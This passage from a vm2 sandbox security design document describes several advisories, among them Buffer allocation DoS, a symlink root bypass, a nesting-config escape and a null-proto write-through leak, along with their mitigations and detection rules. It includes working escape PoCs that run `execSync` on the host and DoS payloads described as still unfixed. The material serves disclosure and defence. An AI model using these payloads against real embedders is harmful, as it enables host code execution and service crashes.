`localPromise` (the sandbox's Promise replacement, declared in `lib/setup-sandbox.js`) is given a constructor that does two things:

1. **Wraps the user-supplied executor in try/catch.** Any synchronous throw — including V8-internal throws produced *inside* the executor by `FormatStackTrace` — is caught and routed through `handleException` (the existing SuppressedError/AggregateError-recursive sanitiser), then `reject`ed. A sandbox-side `.catch()` handler will see a sandbox-realm value rather than a raw host TypeError.
2. **Attaches a benign swallow tail** (`then(undefined, noop)`) to every sandbox-constructed Promise. Even when no user `.catch()` is attached, this internal handler consumes the rejection so the host's `unhandledRejection` event never fires. The tail uses the cached host `then` (captured before vm2's `then` override is installed) to avoid recursing through the sandbox's own override; a re-entrancy flag (`localPromiseInSwallowTail`) prevents the species-protocol from constructing infinitely many swallow-wrapped Promises.

The fix preserves the native semantics for non-callable executors (`new Promise(undefined)` still throws `TypeError` synchronously) and does not affect the resolved-path `.then(onFulfilled)` chain.

### Detection Rules

- **`new Promise((r, j) => { ... })`** with executor body that triggers V8-internal throws (Symbol-named errors, stack-trace formatting issues, recursive proxy traps).
- **`allowAsync: false`** combined with any Promise construction — historically *more* dangerous because `.catch` was blocked, guaranteeing unhandled. Now both modes are equally safe.
- Hostile patterns: `new Promise(() => { throw hostError; })`, `Promise.reject(hostError)` without `.catch()`, async function bodies that throw without try/catch.

### Known Residual — async function / async generator / `await using`

**Status: not yet fixed in v3.10.6. Confirmed exploitable on Node 15+.** Three working ~50–80 byte sandbox payloads terminate the host process:

```javascript
// 1. async function with Symbol-named Error.stack
new VM({ allowAsync: false }).run(`(async function(){
  var e = new Error(); e.name = Symbol(); e.stack;
})();`);

// 2. async generator throw on .next()
new VM({ allowAsync: false }).run(`(async function*(){
  throw new Error('boom');
})().next();`);

// 3. AsyncDisposableStack with throwing Symbol.asyncDispose
new VM({ allowAsync: false }).run(`
  await using x = { [Symbol.asyncDispose]() { throw Symbol() } };
`);
```

V8 creates the rejection promises for `async function`, `async function*`, and `await using` machinery **via the realm's intrinsic Promise (`globalPromise`)** — *not* via `localPromise`. The `localPromise extends globalPromise` constructor and its swallow tail are therefore bypassed entirely. Closing this from inside vm2 requires either (a) a process-level `unhandledRejection` handler scoped to sandbox-realm errors, or (b) rebinding the realm's `%Promise%` intrinsic. Both approaches change observable host behaviour and are deferred past v3.10.6.

**Recommended mitigation for embedders**: install a host-side `process.on('unhandledRejection', ...)` handler that filters or swallows sandbox-originated rejections. See README "Hardening recommendations" for code patterns.

A `it.skip`-marked block in `test/ghsa/GHSA-hw58-p9xv-2mjh/repro.js` pins all three variants so any future fix is testable and so the gap stays visible to maintainers.

### Considered Attack Surfaces

- **`Promise.reject(hostError)` directly**: routes through `localPromise` (because `Promise.reject` delegates to `new this(...)`) and gains the swallow tail. Covered.
- **Silent-failure trade-off**: sandbox developers can no longer use Node's host-side `unhandledRejection` log to surface their own debug rejections. They must explicitly attach `.catch()` for visibility. Acceptable trade-off given the DoS severity; documented for users.

---

## Attack Category 23: Unbounded `Buffer.alloc(N)` — Host Heap DoS

### Description

`Buffer.alloc(N)`, `Buffer.allocUnsafe(N)`, `Buffer.allocUnsafeSlow(N)`, and the deprecated `Buffer(N)` / `new Buffer(N)` forms all execute as a single synchronous host C++ allocation. V8's `timeout` mechanism is an interrupt watchdog that runs *between bytecodes*, so it cannot preempt a single native allocation that is already in flight. An attacker controlling the size argument can therefore amplify a small (≤ 200-byte) sandbox payload into a hundreds-of-megabyte host RSS jump in a single call, bypassing the configured `timeout` entirely. In memory-constrained environments (Docker memory limits, Kubernetes pods, AWS Lambda) this exceeds the container memory budget and triggers `FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`, killing the host process. CVSS reported as High (DoS).

### Attack Flow

1. Attacker submits a small request that runs sandbox code containing `Buffer.alloc(LARGE_N)` (or any of its variants above).
2. The sandbox-side `Buffer.alloc` is exposed by vm2 via the bridge; the call routes through `BaseHandler.apply` to host `Buffer.alloc`.
3. Host `Buffer.alloc(LARGE_N)` runs synchronously in C++; V8's timeout cannot interrupt it.
4. RSS jumps by `LARGE_N` bytes; if `LARGE_N` exceeds the container's available memory, the process OOMs.

### Canonical Example

```javascript
// (advisory GHSA-6785-pvv7-mvg7)
new VM({ timeout: 5000 }).run(`Buffer.alloc(1024*1024*100).length`);
// Returns 104857600. RSS jumps ~770 MB. timeout: 5000 has no effect — the
// allocation completes in one synchronous C++ call.
```

### Why It Works

vm2's primary DoS guard is the `timeout` option, which uses Node's `vm.runInContext` interrupt mechanism. That mechanism only fires between bytecodes, so any single host call that runs entirely in native code (allocation, regex matching with catastrophic backtracking, sync filesystem syscalls, etc.) bypasses it. The Buffer.alloc family is the most weaponizable example: small input, predictable amplification, deterministic crash on memory-constrained hosts.

### Mitigation

New `bufferAllocLimit` option on the `VM` (and inheriting `NodeVM`) constructor, default **`Infinity`** (no cap, preserves prior behaviour for non-breaking semver). Callers who care about the DoS class opt in with a finite byte count (e.g. `bufferAllocLimit: 32 * 1024 * 1024`). The option is plumbed from the host into `setup-sandbox.js` via the existing `data` channel and captured into a closure-scoped const so sandbox-side prototype pollution cannot mutate it. Every entry point to host Buffer allocation is wrapped:

- `Buffer.alloc(size, fill, encoding)` — sandbox-side wrapper checks size, then delegates to the cached host allocator via `Reflect.apply`. Registered with `connect()` so the bridge surfaces this wrapper as the canonical sandbox `Buffer.alloc`.
- `Buffer.allocUnsafe(size)` / `Buffer.allocUnsafeSlow(size)` — same pattern, defense-in-depth (also covered transitively because they delegate to the now-capped `Buffer.alloc`).
- Deprecated `Buffer(N)` / `new Buffer(N)` — `BufferHandler.apply` / `construct` traps already special-case numeric first arg; the cap is added there too.
- **`Buffer.concat(list, totalLength)`** (added GHSA-gmc2-2x9w-cgh9) — caps `totalLength` when supplied, or the summed `list[i].length` when omitted, before delegating to host (which would otherwise call `Buffer.allocUnsafe(totalLength)` internally, bypassing the alloc wrapper).
- **`Buffer.from(value [, encoding | offset, length])`** (added GHSA-gmc2-2x9w-cgh9) — caps `value.length` for object-typed inputs (closes the `{length: N}` array-like DoS path) but excludes TypedArray/DataView/Buffer copies (they have both `.byteLength` and `.buffer`, and the source is already sandbox-allocated). Also caps the explicit `length` third argument used in the ArrayBuffer overload.
- **`Buffer.copyBytesFrom(view, offset, length)`** (added GHSA-gmc2-2x9w-cgh9, Node 22+) — caps `length` when supplied, or `view.byteLength - offset` when omitted. Probed at module load (`typeof host.Buffer.copyBytesFrom === 'function'`) so older Node versions don't crash.

**Fail-closed gate (added GHSA-gmc2-2x9w-cgh9).** At sandbox setup the wrapper enumerates `host.Buffer`'s own keys against an explicit allowlist (`BUFFER_STATIC_CLASSIFIED`: the six capped factories above plus the non-allocating inspectors `byteLength` / `compare` / `isBuffer` / `isEncoding` / `of`). Any function-valued key not on the allowlist is `connect()`'d to a throwing stub that names the missing key and this advisory. A future Node release that ships a new `Buffer.*` allocator therefore cannot reach the host C++ allocator from sandbox code unless a maintainer explicitly classifies the new method — the maintainer-facing failure mode flips from "silent uncapped path" to "explicit throw at first sandbox call". This is the structural piece: the invariant survives "the maintainer forgot to add a wrapper".

Oversized requests throw `RangeError('Buffer allocation size N exceeds bufferAllocLimit M')` synchronously with no host allocation — RSS delta drops from hundreds of megabytes to ~2 MB (just the error object).

The default `Infinity` keeps 3.10.6 fully backwards-compatible — no existing workload encounters a new `RangeError`. Callers who care about the DoS class set `bufferAllocLimit` to a finite number; 32 MiB is a reasonable starting point (generous for legitimate workloads such as image processing, JSON parsing, CSV transformation, which typically stay under 16 MiB per buffer, but tiny compared to typical container memory budgets of 256 MB – 1 GB). A future major release may flip the default to a finite value.

### Detection Rules

- **`Buffer.alloc(N)` / `Buffer.allocUnsafe(N)` / `Buffer.allocUnsafeSlow(N)`** with attacker-controlled N inside sandbox code.
- **`Buffer(N)` / `new Buffer(N)`** — deprecated forms still work and are equivalent.
- **`Buffer.concat(list, totalLength)`** with attacker-controlled `totalLength` (or sandbox-controllable sum of `list[i].length`).
- **`Buffer.from({length: N})`** — array-like with fake numeric `length` triggers host's `fromArrayLike(N)` allocator.
- **`Buffer.from(largeArray)`** — real array of size N allocates N host bytes (1× amplification but cap still applies).
- **`Buffer.copyBytesFrom(view, offset, length)`** (Node 22+) with attacker-controlled `length` or large `view`.

### Canonical Bypass Example (GHSA-gmc2-2x9w-cgh9)

```javascript
// All three bypass the pre-fix bufferAllocLimit cap by reaching the host
// C++ allocator without traversing the sandbox-side allocUnsafe wrapper.
new VM({ bufferAllocLimit: 32*1024*1024 }).run(
    'Buffer.concat([Buffer.from("a")], 50 * 1024 * 1024)'   // 50 MB allocated
);
new VM({ bufferAllocLimit: 32*1024*1024 }).run(
    'Buffer.from({length: 8 * 1024 * 1024})'                // 8 MB allocated
);
```

### Considered Attack Surfaces

- **`new Uint8Array(N)`, `new ArrayBuffer(N)`, `new SharedArrayBuffer(N)` and other typed-array constructors**: same primitive class — synchronous native allocation by attacker-controlled size. **Now capped** — see [Category 36](#attack-category-36-buffallocLimit-bypass-via-arraybuffer--typedarray--webassemblymemory) (GHSA-v836-6xw4-9cx3), which wraps every `ArrayBuffer` / `SharedArrayBuffer` / TypedArray / `WebAssembly.Memory` constructor with the same `bufferAllocLimit` cap when a finite limit is configured.
- **`String.prototype.repeat(N)`**: produces a sandbox-realm string of size `len * N` bytes, similar primitive. Not capped here.
- **Repeated allocations under the cap** (e.g., 32 × `Buffer.alloc(32 MiB)`): an aggregate per-run budget would close this but would require tracking allocation totals across the bridge. Out of scope for the canonical advisory.
- **WebAssembly `memory.grow`**: governed by wasm `maximum` declaration at instantiation; not currently wrapped.

The fix closes the canonical reported DoS (Buffer.alloc family + concat + from + copyBytesFrom) and the fail-closed gate ensures future Buffer.* additions are caught at sandbox-init time rather than only by the next reported advisory.

---

## Attack Category 24: NodeVM `require.root` Symlink Bypass (Path Check/Use TOCTOU)

### Description

`NodeVM`'s `require.root` option restricts sandbox `require()` to a configured filesystem root. The intended invariant is "no code runs from outside the allowed root". The check was implemented as a **lexical** prefix match — `isPathAllowed(filename)` in `lib/resolver-compat.js` verified `filename.startsWith(rootPath)` where `filename` came from `path.resolve()` (no symlink dereference). However, the actual loader is Node's native `require()`, which **does** follow symlinks. A symlink inside the allowed root pointing outside it passes the lexical prefix check, yet the loader follows it and runs code from the symlink's target. CWE-59 (Improper Link Resolution Before File Access).

This is especially severe because:
- pnpm uses symlinks for *every* `node_modules` entry (canonical `<root>/node_modules/<pkg> → <pnpm-store>/<pkg>` layout).
- npm workspaces and `npm link` create equivalent symlinks.
- With `context: 'host'`, the host loader runs the symlinked code with full host privileges — direct RCE.

### Attack Flow

1. **Symlink exists inside the allowed root** pointing outside it. This may be created by an attacker or pre-existing as a side-effect of pnpm/npm-workspaces/`npm link`.
2. **Sandbox calls `require('./link.js')`** (or `require('safe')` for a directory-level symlink).
3. **Resolver runs `path.resolve(...)`** producing a path that starts with `rootPath` and passes `isPathAllowed`.
4. **Loader runs `hostRequire(filename)`** which follows the symlink to outside-root code.
5. **In `context: 'host'`** the loaded module executes with host privileges → RCE.

### Canonical Example

```javascript
// (advisory GHSA-cp6g-6699-wx9c) — file-level symlink
const root = '/tmp/root';
fs.symlinkSync('/tmp/outside.js', '/tmp/root/link.js');
const vm = new NodeVM({ require: { external: true, root, context: 'host' } });
vm.run("require('./link.js')");
// /tmp/outside.js runs in HOST context.

// directory-level symlink variant (e.g. pnpm / npm-workspaces / `npm link`)
fs.symlinkSync(__dirname + '/vm2', '/tmp/root/node_modules/safe');
vm.run("require('safe')");
// vm2 itself runs in HOST context, then attacker uses it to escalate.
```

### Why It Works

The bridge proxy and the bridge's overall threat model are not involved here — this is a filesystem access-control check that runs purely on the host side, and the gap is between two host-side syscalls: `path.resolve()` (lexical) and the kernel's `stat`/`open` chain that follows symlinks. The check and the use operate on different canonical representations of the same path. Classic check/use TOCTOU.

### Mitigation

`fs.realpathSync` is used to canonicalize paths before the prefix check, so the boundary check operates on the same path the loader will follow. Enforces [Defense Invariant](#defense-invariants) #1 at the filesystem-resolver layer: the resolver and the loader must operate on the same canonical path namespace.

1. **`DefaultFileSystem.realpath()` and `VMFileSystem.realpath()`** (in `lib/filesystem.js`) — new methods on the filesystem abstraction. The default delegates to host `fs.realpathSync`; `VMFileSystem` delegates to the user-supplied `fs.realpathSync`.
2. **`isPathAllowed` realpaths the candidate** (in `lib/resolver-compat.js`) before the prefix-vs-rootPaths check. If `realpath` throws (file doesn't exist, broken link) the check **denies by default**.
3. **`rootPaths` are canonicalized at construction time** so a symlinked root configuration (`root: '/tmp/myroot'` where `/tmp/myroot` is itself a symlink) compares the same canonical namespace as the candidate filenames.
4. **Eager FileSystem-contract probe at NodeVM construction** (in `lib/resolver-compat.js`, `makeResolverFromLegacyOptions`). If `require.root` is set, the resolver verifies that the FileSystem adapter implements `realpath()` and that calling it does not throw a `TypeError` (the signal that `VMFileSystem`'s underlying `fs.realpathSync` is missing). On contract violation it throws `VMError` immediately at `new NodeVM(...)` time citing GHSA-cp6g-6699-wx9c, instead of silently denying every later `require()`. Other `realpath` errors at construction (`ENOENT`, `EACCES`) are tolerated — the root may legitimately not exist yet, and runtime `isPathAllowed` will still realpath candidates and deny-by-default.

The race window between the canonicalization syscall and the subsequent loader syscalls is narrow but not eliminated; full mitigation would require atomic `openat`/`O_NOFOLLOW` APIs Node does not expose to user code. CWE-367 residual risk is documented but considered acceptable.

### Detection Rules

- **Symlink inside `require.root`** pointing outside (file-level or directory-level).
- **`fs.realpathSync` on the candidate ≠ `path.resolve` on the candidate** — the smoking gun for this class.
- **pnpm / npm-workspaces / `npm link` layouts** with NodeVM `require.root` configured.

### Considered Attack Surfaces

- **Custom `fs` adapters without `realpath`/`realpathSync`**: existing `VMFileSystem({ fs: customFs })` users whose `customFs` lacks `realpathSync`, and fully custom `FileSystem` adapters that omit `realpath()`, are surfaced at construction time by the eager probe (Mitigation #4). The probe converts what would otherwise be a silent deny-by-default at every later `require()` into a single, clearly-labelled `VMError` at `new NodeVM(...)` — strict security with an actionable error message.
- **Race between resolver-side realpath and loader-side `require`**: theoretically exploitable on a fast filesystem with attacker-controlled symlinks; not closed structurally because Node does not expose `openat`/`O_NOFOLLOW` to user code. Documented residual risk.
- **`mocks` / `overrides`** are unaffected — they don't go through the path resolver.

---

## Attack Category 25: NodeVM `nesting` Configuration Trap (NESTING_OVERRIDE-only resolver)

**Supersedes**: GHSA-8hg8-63c5-gwmx's check on the raw `options.require === false` input, which only fired for one syntactic shape and missed every other configuration that collapses to the same insecure resolver — see GHSA-m4wx-m65x-ghrr.

### Description

`NodeVM`'s `nesting` option (when truthy) injects a `NESTING_OVERRIDE` builtin that exposes the `vm2` package to sandbox code regardless of any other `require` configuration. The override is unconditional — it survives `require: false`, narrow `builtin` allowlists, and every other restriction the user might set. With `vm2` reachable, the sandbox constructs an inner `NodeVM` whose `require` config is **chosen by the sandbox code, not constrained by the outer config** (this is by design of `nesting`). The inner NodeVM can be configured with `child_process`, `fs`, or any other host module → full host RCE.

The trap is **any** `NodeVM` configuration where a truthy `nesting` is combined with a `require` that isn't a real require-config object. Three input-shape classes all collapse to the same NESTING_OVERRIDE-only resolver:

- **Falsy / omitted `require`** — `{ nesting: true }`, `{ nesting: true, require: false / undefined / null / 0 / '' }`. `makeResolverFromLegacyOptions(falsy, NESTING_OVERRIDE, …)` hits its `if (!options)` branch.
- **Truthy non-object `require`** — `{ nesting: true, require: true / 1 / 'yes' / Symbol() / function(){} }`. `makeResolverFromLegacyOptions` destructures every primitive/function value to all-`undefined`, then calls `makeBuiltinsFromLegacyOptions(undefined, …, NESTING_OVERRIDE)` — the same call shape the `if (!options)` branch produces.
- **Truthy non-`true` `nesting`** — `{ nesting: 1 / 'yes' / {} / [] / function(){}, require: false }`. The override gate inside the constructor is `nesting && NESTING_OVERRIDE`, which fires for ANY truthy value.

All shapes produce a resolver whose only builtin is `vm2` — a pure escape primitive with no legitimate use. The original GHSA-8hg8 patch tested only the literal `{ nesting: true, require: false }` shape with strict equality on the raw input, leaving every other path as a bypass.

CWE-284 (Improper Access Control). CWE-697 (Incorrect Comparison) for the original GHSA-8hg8 check, which compared too narrowly against the set of values that reach the insecure resolver.

### Attack Flow

1. **Host configures `nesting: true`** *without* providing an explicit `require` config object — e.g. `new NodeVM({ nesting: true })`. The developer assumes the absence of `require` means "no host modules" (matching the rest of the API's default-deny stance).
2. **Sandbox code requires `vm2`**: succeeds because `NESTING_OVERRIDE` injected `vm2` into the builtin map even though the surrounding `require` config is empty/denied.
3. **Sandbox constructs inner NodeVM** with attacker-chosen `require` config: `new NVM({ require: { builtin: ['child_process'] } })`.
4. **Inner sandbox loads `child_process`** and runs arbitrary commands as the host process user.

### Canonical Example

```javascript
// GHSA-m4wx-m65x-ghrr PoC — patches the literal-PoC fix of GHSA-8hg8-63c5-gwmx.
const vm = new NodeVM({ nesting: true }); // `require` omitted; defaults to false post-destructure
vm.run(`
  const { NodeVM: NVM } = require('vm2');
  const inner = new NVM({ require: { builtin: ['child_process'] } });
  module.exports = inner.run(
    'module.exports = require("child_process").execSync("id").toString()'
  );
`);
// uid=1000(...) ...
```

### Why It Works

The bug lives in `lib/resolver-compat.js` `makeResolverFromLegacyOptions`:

```javascript
function makeResolverFromLegacyOptions(options, override, compiler) {
    if (!options) {
        if (!override) return DENY_RESOLVER;     // require:false alone → deny all
        // require:falsy + nesting:true → permissive resolver with vm2 loadable:
        const builtins = makeBuiltinsFromLegacyOptions(undefined, defaultRequire, undefined, override);
        return new Resolver(DEFAULT_FS, [], builtins);
    }
    ...
}
```

The GHSA-8hg8 patch tried to reject this configuration at the `NodeVM` constructor, but used `options.require === false` — strict equality against the raw input. The destructuring default (`require: requireOpts = false`) runs *after* the check, so omitting `require`, passing `undefined`, or any other path that doesn't write the literal `false` into `options.require` slipped past the guard and still produced `requireOpts = false`. The GHSA-m4wx bypass is purely the gap between "check the raw input shape" and "check the value actually used to build the resolver."

The "mental-model mismatch" framing applies at two levels: the *configuration* trap (developers think `nesting: true` is orthogonal to `require`) and the *check* trap (the original patch checked the user-facing option name instead of the destructured value).

### Mitigation

`NodeVM` constructor (`lib/nodevm.js`) destructures options first, then throws `VMError` when *any truthy `nesting`* is paired with a `requireOpts` that isn't a real require-config object (or a `Resolver` instance). The check lives on the value that actually drives `makeResolverFromLegacyOptions`, so every shape that collapses to the NESTING_OVERRIDE-only resolver collapses to the same rejection:

```javascript
const { require: requireOpts = false, nesting = false, /* ... */ } = options;
const hasRealRequireConfig =
    requireOpts instanceof Resolver
    || (typeof requireOpts === 'object' && requireOpts !== null);
if (nesting && !hasRealRequireConfig) {
    throw new VMError('NodeVM `nesting` requires an explicit `require` config object. …');
}
```

The guard mirrors the actual reachability of the insecure resolver on two axes:

- **`nesting` checked as truthy**, matching the `nesting && NESTING_OVERRIDE` gate that decides whether `vm2` is exposed. Covers `nesting: true / 1 / 'yes' / {} / [] / function(){}` uniformly.
- **`requireOpts` must be a non-null object** (or a custom `Resolver` instance). Primitives and functions all destructure to all-undefined inside `makeResolverFromLegacyOptions` and produce the insecure resolver, so they are rejected.

This establishes **Defense Invariant: Configurations that produce a NESTING_OVERRIDE-only resolver must fail loudly at construction.** The escape hatch (any truthy `nesting` + an explicit `require` config object, even `{}` or `Object.create(null)`) continues to work — the developer's "I accept the trade-off" signal is visible in the call site.

### Detection Rules

- **`new NodeVM({ nesting: <truthy>, ... })`** with `require` set to anything other than a non-null object (or `Resolver`) — flagged at construction with `VMError` mentioning GHSA-m4wx-m65x-ghrr. Covers `require: false / undefined / null / 0 / '' / true / 1 / 'yes' / Symbol() / function(){}` and `nesting` values `true / 1 / 'yes' / {} / [] / function(){}`.
- **`new NodeVM({ nesting: true })`** with no `require` field at all — closed by GHSA-m4wx-m65x-ghrr (was the loophole the original GHSA-8hg8 fix left open).
- **Sandbox code containing `require('vm2')`** — only reachable when `nesting` is truthy *and* an explicit `require` config object was supplied; almost always indicates an escape attempt unless the embedder explicitly built a VM-spawning host integration.

### Considered Attack Surfaces

- **`{ nesting: true, require: { builtin: ['something'] } }`** — does NOT throw. The developer has explicitly opted into the documented escape hatch. README and JSDoc loudly state that `nesting: true` is unsafe for untrusted code; this is a documentation-level mitigation. Constraint propagation from outer to inner NodeVM is out of scope.
- **`{ nesting: true, require: {} }`** — also does NOT throw. An empty object is a truthy explicit signal; `makeResolverFromLegacyOptions` falls into the "options-provided" branch and builds a resolver where the only builtin is still `vm2` (via override), but the developer's intent is visible at the call site.
- **Sandbox-side `require('vm2')` when `nesting: false`** — already throws `EDENIED` because the override is not installed. Unaffected.
- **`mocks` / `overrides`** — bypass the resolver entirely; unaffected by this fix and unaffected by `nesting: true` (mocks don't carry the `vm2` package).

---

## Attack Category 26: Sandbox-Realm Null-Proto via Bridge `from()` — Set-Trap Write-Through

**Uses**: [Category 1](#attack-category-1-constructor-chain-traversal) (host `Function` via `.constructor`), [Category 6](#attack-category-6-proxy-trap-exploitation) (bridge `set` trap as the actual leak vector).

**Supersedes**: defense-in-depth portion of GHSA-mpf8-4hx2-7cjg's fix that extended `from()` to `handleException` and `globalPromise.prototype.then` onFulfilled.

### Description

`bridge.from(other)` constructs a sandbox-side proxy whose internal target the bridge **treats as an other-realm (host) object**. The proxy's `set` trap therefore unwraps incoming sandbox bridge proxies (`otherFromThis(value)`) back to their raw host references and writes them directly onto the underlying target via `otherReflectSet(object, key, value)`.

When `from()` is called from a sandbox-side path with a **sandbox-realm null-proto value**, the proxy's underlying target IS the sandbox object. The write-through path then stores raw host references onto a sandbox-visible object, readable via the original sandbox reference (which bypasses the proxy entirely). Reading `.constructor` on a leaked host function yields host `Function`; `Function('return process')()` is RCE.

The post-GHSA-mpf8 hardening (commit `b57ac2d`, "setup-sandbox defense-in-depth (mpf8 symmetry)") added `from()` calls in three sandbox-side spots — `handleException` (transformer-instrumented JS catch path), `globalPromise.prototype.then` onFulfilled wrapper, and the `setHostPromiseSanitizers` install — for "symmetry" with the original GHSA-mpf8 fix. Two of those callsites receive sandbox-realm values and turn them into write-through proxies; this is the leak path GHSA-9vg3-4rfj-wgcm exploits.

CVSS:3.1 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Sandbox creates a null-proto carrier: `const o = {__proto__: null}`.
2. Sandbox throws it: `throw o`. Transformer-instrumented catch calls `e = handleException(e)`.
3. `handleException` was passing `e` through `from(e)`. With `e`'s prototype being null, `bridge.from()` had no proto-mapping to consult and built a sandbox-side proxy treating `o` as host-realm.
4. Sandbox writes a sandbox-side proxy of a host function onto the proxy: `e.f = Buffer.prototype.inspect`. The bridge `set` trap converts the sandbox value to host realm via `otherFromThis(value)`, yielding the **raw host `inspect`**, then stores it on the underlying target — which is the sandbox object `o`.
5. Sandbox reads via the original reference: `o.f` returns the raw host function (no proxy in the way; `o` IS sandbox-realm, so plain property access bypasses the bridge entirely).
6. `o.f.constructor` is host `Function` → `Function('return process')()` → host `process` → RCE.

The same bug exists on the `globalPromise.prototype.then` onFulfilled path: `Promise.resolve({__proto__:null}).then(e => { e.f = HostFn; ... })`.

### Canonical Examples

```javascript
// (advisory GHSA-9vg3-4rfj-wgcm)
const {VM} = require("vm2");
new VM().run(`
  const o = {__proto__: null};
  try {
    throw o;
  } catch (e) {
    e.f = Buffer.prototype.inspect;
    o.f.constructor("return process")()
      .mainModule.require('child_process').execSync('touch pwned');
  }
`);
```

```javascript
// Promise.then variant
new VM().run(`
  (async () => {
    const o = {__proto__: null};
    return Promise.resolve(o).then(e => {
      e.f = Buffer.prototype.inspect;
      return o.f.constructor('return process')();
    });
  })()
`).then(p => console.log(p)); // host process leaked
```

### Why It Works

`bridge.from()` (= `thisFromOtherWithFactory(defaultFactory, other)`) is **defined for host-realm inputs**. Its internal logic walks the prototype chain looking for a `protoMappings` entry; if proto is null and no mapping found, it creates a default proxy via `thisProxyOther(factory, other, null, dangerous)`. The bridge has no realm-tagging on raw values, so it cannot distinguish "host null-proto object the sandbox should see wrapped" (the GHSA-mpf8 motivating case) from "sandbox null-proto object the sandbox already owns" (this GHSA's case).

The post-GHSA-mpf8 commit `b57ac2d` extended `from()` to two sandbox-side callsites — `handleException` and `globalPromise.prototype.then` onFulfilled — purely for "symmetry"; no exploit existed for the sandbox-side path at the time. Those callsites do not receive host-realm values in normal flow: host throws are pre-converted by the bridge `apply`-trap's `thisFromOtherForThrow`, and host-promise resolutions are intercepted at the bridge level via `wrapHostPromiseThenArgs`. The "symmetry" wrap therefore only ever fires on sandbox-realm values, where it creates the dangerous write-through proxy.

### Mitigation

Restores [Defense Invariant 2](#defense-invariants) ("All caught exceptions are sanitized") with the **right** sanitizer for each callsite's actual realm context, and Defense Invariant 1 by ensuring `from()` is not used to "wrap" sandbox-realm values into host-treating proxies.

`lib/setup-sandbox.js`:

- `handleException` (line ~876): `e = from(e)` → `e = ensureThis(e)`. `ensureThis` returns sandbox-realm values unchanged and walks the proto chain only for host-mapped values, so a sandbox null-proto value stays sandbox-realm. SuppressedError / AggregateError sub-error recursion still works because each sub-call routes through the same `ensureThis` and the sub-error proto chain reaches a known host Error prototype mapping for genuinely-host sub-errors.
- `globalPromise.prototype.then` onFulfilled wrap (line ~283): same change. The host-promise resolution path is unaffected because it goes through the bridge-level `wrapHostPromiseThenArgs` interception, which keeps using `from()` (correct — values there ARE host-realm).
- `bridge.setHostPromiseSanitizers` install (line ~959): the rejection sanitizer is now `e => handleException(from(e))` instead of `handleException`. The explicit outer `from(e)` preserves the GHSA-mpf8 invariant for genuinely-host null-proto rejection values (they reach sandbox callbacks bridge-wrapped, not raw); the inner `handleException` then performs SuppressedError / AggregateError recursive sanitization on the wrapped value.

The fix surface is three lines of code in `setup-sandbox.js`, no bridge changes.

### Detection Rules

- **`from(value)` calls in sandbox-side code paths** — `lib/setup-sandbox.js` and any future sandbox-side callsite. Whenever the value can be sandbox-realm by construction (transformer catch path, sandbox-Promise rejection, executor catch), the call must use `ensureThis` (sandbox-passthrough for unmapped values) instead of `from` (always-wrap).
- **`{__proto__: null}` followed by `throw` or `Promise.resolve(...)` in untrusted code review** — the canonical attack carrier. Innocuous on its own, but combined with property assignment in catch / `.then` it's a write-through probe.
- **`obj.constructor("return process")` or `obj.f.constructor("return ...")` patterns** — the post-leak escape primitive. Flag in code review even when wrapped in try/catch.
- **Reverts of the b57ac2d "symmetry" change** — any future commit re-introducing `from()` in `handleException` or sandbox-side `Promise.prototype.then` onFulfilled must re-prove the realm assumption holds for every callsite reachable on those paths.

### Considered Attack Surfaces

- **`localPromise` constructor catch wrapper** (line ~76): `reject(handleException(e))`. The executor runs in the sandbox; `e` is a sandbox-realm thrown value (host throws inside an executor that was passed through the bridge would already be wrapped at the bridge boundary). `handleException` now uses `ensureThis` internally, so this path is safe.
- **Sandbox-side `localPromise.prototype.then` onRejected wrap** (line ~1170): also routes through `handleException`. Same reasoning — sandbox-realm rejection value, `ensureThis` correctly passes through.
- **`readonly()` factory `from(mock)` call** (line ~1281): `mock` is a sandbox-supplied user value that the embedder asked to read-only-mock onto a host target. The wrap is intentional (the value crosses TO the host as the read-side data). Sandbox cannot exploit the resulting proxy because it doesn't have a sandbox-side reference to the underlying mock object identity.
- **Bridge-level `wrapHostPromiseThenArgs` / `wrapHostPromiseCatchArgs`**: still use `from()` directly, correct because at that layer the value is host-realm by construction (delivered from host Promise machinery).

---

## Attack Category 27: Internal State Probe via Computed Property Access on `globalThis`

**Uses**: [Category 12](#attack-category-12-code-transformation-bypass) (the transformer is a syntactic gate; computed keys are invisible to it).

**Supersedes**: GHSA-wp5r-2gw5-m7q7 ("Transformer Fast-Path Bypass Exposes Internal State Variable") whose mitigation tightened the transformer's identifier-rejection but kept `globalThis[INTERNAL_STATE_NAME]` reachable for any non-identifier read path.

### Description

The transformer protects the `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL` identifier so user source cannot reference it as a bare name (any declaration or use, including `\u`-escaped variants, throws `Use of internal vm2 state variable`). Until this fix, however, the value the identifier resolves to was installed as a permanent non-enumerable own property on the sandbox `globalThis`. Identifier rejection is a *syntactic* control, but property reads use a *dynamic* key — the AST walker has no way to evaluate `globalThis[k]` where `k` is a string literal, a computed string, a base-decoded blob, or a key obtained from `Object.getOwnPropertyNames(globalThis)`. Every reflective probe of the global object therefore returned the live state object and its `wrapWith` / `handleException` / `import` methods.

CVSS:3.1 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). CWE-693 (Protection Mechanism Failure). Today the exposed methods are defensive utilities only and there is no direct escape primitive — the impact is "complete bypass of a security control" and the latent attack surface for any future addition to the state object.

### Attack Flow

1. Sandbox code asks `globalThis['VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL']` (string literal, transformer never inspects strings) — pre-fix returned the state object.
2. Or `Reflect.get(globalThis, '…')` / `Object.getOwnPropertyDescriptor(globalThis, '…')` / `'…' in globalThis` — same.
3. Or simply `Object.getOwnPropertyNames(globalThis).filter(n => n.startsWith('VM2_'))` to *discover* the canonical name without hardcoding it, then read with bracket access.
4. The returned object's properties are sandbox-realm functions (`wrapWith`, `handleException`, `import`); calling them today is innocuous, but any future sensitive method on that object would be immediately exploitable.

### Canonical Examples

```javascript
// (advisory GHSA-2cm2-m3w5-gp2f)
const {VM} = require("vm2");
console.log(new VM().run(`
  globalThis['VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL']
`));
// pre-fix: { wrapWith, handleException, import }
```

```javascript
// Equivalent variants — all resolve via the same own-property read path
